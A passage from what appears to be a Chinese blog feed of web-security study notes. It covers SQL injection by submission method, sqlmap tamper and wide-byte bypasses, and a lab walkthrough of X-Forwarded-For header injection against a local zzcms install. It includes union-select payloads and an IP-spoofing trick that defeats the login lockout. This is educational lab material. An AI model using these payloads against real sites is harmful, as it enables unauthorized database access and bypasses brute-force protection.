class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>因为身份认证的问题已经被原题解决，只需要随便输入两个一模一样的密码即可。</p><p>验证方式：退出登录，使用修改后的密码登录。登得进去证明更改成功，登不进去证明更改不成功。</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0019-WEB攻防-10-通用漏洞之SQL数据库-提交方式注入/功能与数据的正常运行与提交</title>
      <link href="/2023/05/22/SEC-Study-0047/"/>
      <url>/2023/05/22/SEC-Study-0047/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、数据请求方式-GET&amp;POST&amp;COOKIE等<br>2、常见功能点请求方式-用户登录&amp;IP记录等<br>3、黑盒白盒注入测试要点-SQLMAP注入参数</p><h1 id="补充点："><a href="#补充点：" class="headerlink" title="补充点："></a>补充点：</h1><p>黑盒测试：功能点分析<br>白盒测试：功能点分析&amp;关键代码追踪</p><p>1.数据库注入    - access mysql mssql oracle mongodb postgresql等<br>2.数据类型注入 - 数字型 字符型 搜索型 加密型(base64 json)等<br>3.提交方式注入 - get post cookie http头等<br>4.查询方式注入 - 查询 增加 删除 更新 堆叠等<br>5.复杂注入利用 - 二次注入 dnslog注入 绕过bypass等</p><p>➢GET&amp;POST&amp;COOKIE&amp;SERVER<br>➢实例黑盒-后台表单登陆框-POST注入<br>➢实例白盒-ESPCMS-商品购买-COOKIE注入<br>➢实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入</p><h1 id="部分语言接受代码块"><a href="#部分语言接受代码块" class="headerlink" title="部分语言接受代码块"></a>部分语言接受代码块</h1><h2 id="功能阐释"><a href="#功能阐释" class="headerlink" title="功能阐释"></a>功能阐释</h2><p>数据提交/接收方式的决定因素：</p><ul><li>数据大小</li><li>数据类型</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">三种交互式</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.后台记录操作访问IP</span><br><span class="line"></span><br><span class="line">    代码获取访问者的IP地址 </span><br><span class="line">    =&gt; 获取到的IP地址是否会记录到数据库当中？</span><br><span class="line">        =&gt; 是，进行IP地址替换，自定义IP地址 =&gt; 进行SQL注入（和数据库有联系）(如果插入可以直接执行，就是一个sql注入)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.网站要根据用户的访问设备给予显示页面</span><br><span class="line"></span><br><span class="line">    页面随访问设备不同而变更，提高用户体验。</span><br><span class="line">    注入存在：将网站使用者的UA传入数据库进行比对，符合SQL注入的条件</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.网站要进行文件上传，用户登录POST</span><br><span class="line"></span><br><span class="line">    文件上传可大可小，如果采用get请求则不满足（文件数据长度过大）</span><br><span class="line">    注入点：用户登录，接受账户密码，进行数据库查询和对比。</span><br></pre></td></tr></table></figure><h2 id="各部分代码接受数据的方式"><a href="#各部分代码接受数据的方式" class="headerlink" title="各部分代码接受数据的方式"></a>各部分代码接受数据的方式</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP接受数据的方式：</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据的大小和类型决定了数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// GET,POST,COOKIE,REQUEST获取变量值</span></span><br><span class="line">    <span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">    <span class="variable">$post</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$request</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前访问的url地址</span></span><br><span class="line">    <span class="variable">$host</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line">    <span class="comment">// 当前访问的浏览器信息（UA头）</span></span><br><span class="line">    <span class="variable">$user_agent</span>=<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>];</span><br><span class="line">    <span class="comment">// 获取客户端IP地址</span></span><br><span class="line">    <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$get</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$post</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cookie</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$request</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$host</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$user_agent</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">JS接受数据的方式：</span><br><span class="line">    Java Spring  不同框架，不同写法</span><br><span class="line">    <span class="comment">// 获取GET，POST参数</span></span><br><span class="line">    method=RequestMethod.GET：指定 HTTP GET 请求方法。</span><br><span class="line">    method=RequestMethod.POST：指定 HTTP POST 请求方法。</span><br><span class="line">    request.<span class="title function_ invoke__">getParameter</span>(<span class="string">&quot;参数名&quot;</span>)：(都接受)获取传递给当前请求的查询参数或表单数据中指定键的值。</span><br><span class="line">        在 Spring 框架中，可以使用 @<span class="title function_ invoke__">RequestParam</span>(<span class="string">&quot;参数名&quot;</span>) 注解来实现同样的效果。</span><br><span class="line">    </span><br><span class="line">        可以直接获取get请求的参数key对应的value                               </span><br><span class="line">        也可以从请求体中获取参数的key对应的value</span><br><span class="line"></span><br><span class="line">Python接受web数据的方式</span><br><span class="line">    Python flask 不同框架，不同写法</span><br><span class="line">    requests.<span class="title function_ invoke__">get</span>(url)：发送 HTTP GET 请求到指定的 URL。</span><br><span class="line">    requests.<span class="title function_ invoke__">post</span>(url, data)：发送 HTTP POST 请求到指定的 URL，其中包含指定的数据。</span><br><span class="line">    request.args.<span class="title function_ invoke__">get</span>(key)：获取传递给当前请求的查询参数（query parameter）中指定键的值。</span><br><span class="line">    request.form.<span class="title function_ invoke__">get</span>(key)：获取传递给当前请求的表单数据（form data）中指定键的值。</span><br><span class="line">    request.values.<span class="title function_ invoke__">get</span>(key)：(都接受)获取传递给当前请求的所有参数（不论是查询参数还是表单数据）中指定键的值。如果同一键名既出现在查询参数中又出现在表单数据中，则以表单数据中的值为准。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">无参数不代表无法注入</span><br><span class="line">黑盒测试：看功能看特性，猜测数据请求的方式进行分析</span><br><span class="line">判断POST注入点</span><br><span class="line">    <span class="number">1</span>.抓包：BP抓包</span><br><span class="line">    <span class="number">2</span>.看功能点：用户登录基本为POST</span><br><span class="line"></span><br><span class="line">    行为记录：IP地址记录等--都是实战得出的</span><br><span class="line"></span><br><span class="line">白盒测试： </span><br><span class="line">    根据login.php源代码猜测到登录时需要对IP进行认证，</span><br><span class="line">    可以使用XFF进行伪造</span><br><span class="line">        =&gt; 重点页面，重点判断逻辑+重点函数方法分析</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0018-WEB攻防-09-通用漏洞之SQL数据库-脚本</title>
      <link href="/2023/05/21/SEC-Study-0046/"/>
      <url>/2023/05/21/SEC-Study-0046/</url>
      
        <content type="html"><![CDATA[<h1 id="Tamper脚本-amp-Base64-amp-Json-amp-md5"><a href="#Tamper脚本-amp-Base64-amp-Json-amp-md5" class="headerlink" title="Tamper脚本&amp;Base64&amp;Json&amp;md5"></a>Tamper脚本&amp;Base64&amp;Json&amp;md5</h1><!-- ➢本地源码-数字&字符&搜索&编码&JSON➢墨者靶场-字符转义处理防护-宽字节注入➢真实WEB-数据编码接受处理-base64注入➢真实WEB-JSON数据格式&MD5加密数据➢工具脚本-SQLMAP-脚本Tamper使用指南 --><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP代码传递SQL语句时，可能遇到sql语句闭合</span><br><span class="line"></span><br><span class="line">sql注入的各个类型</span><br><span class="line">数字型  <span class="number">0</span>~<span class="number">9</span></span><br><span class="line">    select * <span class="keyword">from</span> `table_name` where id=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">字符型  =&gt;a-z 中文 标点符号</span><br><span class="line">    <span class="comment"># 假设一个原始的sql语句是这样子的：</span></span><br><span class="line">        select * <span class="keyword">from</span> `table_name` where id=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="comment"># 那么它可能存在一种被注入的可能：符号的闭合</span></span><br><span class="line">        使用 <span class="string">&quot; 或者 &#x27; 来闭合字符串，可以避免注入的代码被当中字符串来处理。   </span></span><br><span class="line"><span class="string">            select * from `table_name` where id=&#x27;1 &#x27; or 1=1 order by 3 --+&#x27;</span></span><br><span class="line"><span class="string">            后面的单引号就会被注释掉，并且执行order by 3</span></span><br><span class="line"><span class="string">            1 &#x27; or 1=1 order by 3 --+</span></span><br><span class="line"><span class="string">    # 注意：如果遇上类似于框架那种自动过滤sql注入的防御机制，就得另外想办法了。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">搜索型  =&gt;加入了通配符%</span></span><br><span class="line"><span class="string">    <span class="subst">$sql</span>=&quot;</span>select * <span class="keyword">from</span> `table_name` where gname like <span class="string">&#x27;%$s%&#x27;</span><span class="string">&quot;; =&gt; 需要考虑闭合百分号</span></span><br><span class="line"><span class="string">    这句话的意思是模糊查询表内容，gname列中含有<span class="subst">$s</span>的内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">编码型  </span></span><br><span class="line"><span class="string">    =&gt;数据以编码值进行传递</span></span><br><span class="line"><span class="string">    =&gt;数据进行编码后接受处理</span></span><br><span class="line"><span class="string">    发送编码值，对方对编码值进行解码，获取其中的数据再放入SQL并执行语句</span></span><br><span class="line"><span class="string">    在注入的时候，我们也需要尝试对注入的Payload进行编码后提交</span></span><br><span class="line"><span class="string">        select * from `table_name` where id=MQ==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">加密型</span></span><br><span class="line"><span class="string">    数据以加密的密文进行传送</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">格式型</span></span><br><span class="line"><span class="string">    JSON-&gt;键值键名大括号的形式</span></span><br></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sqlmap base64绕过</span><br><span class="line">    sqlmap相关关键信息的博客：https:<span class="comment">//www.cnblogs.com/bmjoker/p/9326258.html</span></span><br><span class="line">    --tamper=base64encode.py    ：调用tamper目录下的base64encode.py脚本，处理带有base64加密的参数</span><br><span class="line"></span><br><span class="line">宽字节绕过：</span><br><span class="line">    背景：所有的注入语句被转义</span><br><span class="line">        http:<span class="comment">//www.xxx.com?id=12 &#x27; order by 12 --+ </span></span><br><span class="line">        后台解释时变成了：（关键的<span class="string">&#x27;被转义掉了）</span></span><br><span class="line"><span class="string">            select * from table_name where id=&#x27;</span><span class="number">12</span> \<span class="string">&#x27; order by 12 --+&#x27;</span></span><br><span class="line">        <span class="number">1</span>.产生于一个PHP函数：</span><br><span class="line">            <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>)</span><br><span class="line">        <span class="number">2</span>.魔术引号：PHP扩展之magic_quotes_gpc</span><br><span class="line">            选择则自动转义 </span><br><span class="line">    绕过的办法：%df</span><br><span class="line">        \               占用一个字符</span><br><span class="line">        中文乱码(%df生成的)   占用两个字符</span><br><span class="line">        绕过的原理是使用乱码把\占用的空间消耗掉，使后台的\失效，相对于变成了完整的注入语句</span><br><span class="line">        select * <span class="keyword">from</span> table_name where id=<span class="string">&#x27;12 &#x27;</span> order by <span class="number">12</span> --+<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">结论：</span></span><br><span class="line"><span class="string">    工具，扫描脚本都无法直接识别出数据是否被加密再进行测试，或者说，无法判断数据类型和格式等。</span></span><br><span class="line"><span class="string">    这时候就应该尝试自己去人工识别，是否被加密什么的，进行人工的对工具的修改和加载插件，再次探针才可以。</span></span><br><span class="line"><span class="string">    如果熟悉Python，还能自己写脚本</span></span><br></pre></td></tr></table></figure><h1 id="测试学习之黑白盒-HTTP头注入"><a href="#测试学习之黑白盒-HTTP头注入" class="headerlink" title="测试学习之黑白盒-HTTP头注入"></a>测试学习之黑白盒-HTTP头注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">XFF存在的条件：</span><br><span class="line"><span class="number">1</span>.存在获取XFF的函数方法: <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>)</span><br><span class="line"><span class="number">2</span>.存在将IP地址放入数据库查询的语句，且一般是未转义的类型</span><br></pre></td></tr></table></figure><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>)  获取数据包头部信息X-Forwarded-For指定的IP地址</span><br><span class="line"><span class="title function_ invoke__">getenv</span>()                        用于获得指定名称的环境变量值</span><br><span class="line"></span><br><span class="line">目标站点：zzcms8.<span class="number">0</span></span><br><span class="line">目的：使用XFF对站点进行SQL注入</span><br><span class="line">目标网页：http:<span class="comment">//127.0.0.1:8036/admin/login.php</span></span><br><span class="line"></span><br><span class="line">总结：功能点分析+关键代码追踪</span><br></pre></td></tr></table></figure><p>过程：</p><h3 id="使用火狐BP拦截"><a href="#使用火狐BP拦截" class="headerlink" title="使用火狐BP拦截"></a>使用火狐BP拦截</h3><p>拦截数据包如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /admin/logincheck.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8036</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">113.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 50</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8036</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8036/admin/login.php</span></span><br><span class="line"><span class="comment">Cookie: UM_distinctid=186cfa9dc6a710-0dcbfdf03f31a98-d555429-144000-186cfa9dc6b1227; CNZZDATA1277915428=1687386700-1571722458-http%253A%252F%252F127.0.0.1%252F%7C1571722458; Gpa6_2132_logintime=1678521459; security=low; PHPSESSID=a8b34abadc72da74fe40f008862b775e; thinkphp_show_page_trace=0|0</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">admin=ad&amp;pass=123&amp;yzm=8&amp;Submit=%E7%99%BB+%E5%BD%95</span></span><br></pre></td></tr></table></figure><h3 id="插入XFF并且修改数据包"><a href="#插入XFF并且修改数据包" class="headerlink" title="插入XFF并且修改数据包"></a>插入XFF并且修改数据包</h3><p>获取IP地址的源代码存在XFF漏洞,具体代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>), <span class="string">&quot;unknown&quot;</span>)) </span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>), <span class="string">&quot;unknown&quot;</span>)) </span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>), <span class="string">&quot;unknown&quot;</span>)) </span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;REMOTE_ADDR&quot;</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>], <span class="string">&quot;unknown&quot;</span>)) </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>; </span><br><span class="line"><span class="keyword">return</span>(<span class="variable">$ip</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>证明XFF存在，可以使用XFF注入攻击</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getenv</span>(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>) =&gt; 用来证明使用了XFF</span><br><span class="line">这是需要插入的XFF ： </span><br><span class="line">    X-Forwarded-For: <span class="number">12.1</span>.<span class="number">2.3</span> =&gt; IP地址随意，只要不重复就行</span><br></pre></td></tr></table></figure><p>插入后的数据包如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /admin/logincheck.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8036</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">113.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 12.1.2.3</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 50</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8036</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8036/admin/login.php</span></span><br><span class="line"><span class="comment">Cookie: UM_distinctid=186cfa9dc6a710-0dcbfdf03f31a98-d555429-144000-186cfa9dc6b1227; CNZZDATA1277915428=1687386700-1571722458-http%253A%252F%252F127.0.0.1%252F%7C1571722458; Gpa6_2132_logintime=1678521459; security=low; PHPSESSID=a8b34abadc72da74fe40f008862b775e; thinkphp_show_page_trace=0|0</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">admin=ad&amp;pass=123&amp;yzm=8&amp;Submit=%E7%99%BB+%E5%BD%95</span></span><br></pre></td></tr></table></figure><p>返回信息如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Thu, <span class="number">25</span> May <span class="number">2023</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">16</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">39</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span>.<span class="number">45</span></span><br><span class="line">Expires: Thu, <span class="number">19</span> Nov <span class="number">1981</span> <span class="number">08</span>:<span class="number">52</span>:<span class="number">00</span> GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=<span class="number">0</span>, pre-check=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">287</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="comment"># alert(&#x27;用户名或密码错误！你还可以尝试 4 次&#x27;); =&gt;这是提示信息，为0次会导致对应的IP地址被锁定</span></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;用户名或密码错误！你还可以尝试 4 次&#x27;</span>);history.<span class="title function_ invoke__">back</span>()&lt;/script&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>观察得出的信息：更改XFF地址可以使得提示信息不断重置为4次，避免出现IP地址被锁定的事情。<br>锁定IP地址是指：指定的IP地址在限定时间内无法登录，或者指定IP地址永远无法登录。</p><h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在get和post参数很难注入，尝试对XFF进行注入</span><br><span class="line"></span><br><span class="line">XFF注入的源代码依据：</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from zzcms_login_times where ip=&#x27;<span class="subst">$ip</span>&#x27; and count&gt;=&quot;</span>.trytimes.<span class="string">&quot; and unix_timestamp()-unix_timestamp(sendtime)&lt;&quot;</span>.jgsj.<span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注入语句为：(当数字超过<span class="number">4</span>时，提示信息变了，说明边界是<span class="number">4</span>)</span><br><span class="line">    X-Forwarded-For: <span class="number">12.21</span>.<span class="number">2.3</span><span class="string">&#x27; order by 4#</span></span><br><span class="line"><span class="string">    拼接到后台显示的句子就变成了：</span></span><br><span class="line"><span class="string">    $sql=&quot;select * from zzcms_login_times where ip=&#x27;</span><span class="number">12.21</span>.<span class="number">2.3</span><span class="string">&#x27; order by 4#&#x27;</span> <span class="keyword">and</span> count&gt;=<span class="string">&quot;.trytimes.&quot;</span> <span class="keyword">and</span> <span class="title function_ invoke__">unix_timestamp</span>()-<span class="title function_ invoke__">unix_timestamp</span>(sendtime)&lt;<span class="string">&quot;.jgsj.&quot;</span> <span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">把注入语句变更为：</span></span><br><span class="line"><span class="string">X-Forwarded-For: 45,56,66,67&#x27; union select 1,2,3,4 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">后面能查询相关的关键账密信息表等信息就和前面的sql注入差不多了。</span></span><br></pre></td></tr></table></figure><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>以上时对zzcms的手工注入，下面是工具注入。<br>使用一个post.txt的文件写入数据包，并且把xff段的IP地址末尾标上*，表示存在注入点<br>总结：功能点分析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /admin/logincheck.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8036</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">113.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 12.21.2.31*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 50</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8036</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8036/admin/login.php</span></span><br><span class="line"><span class="comment">Cookie: 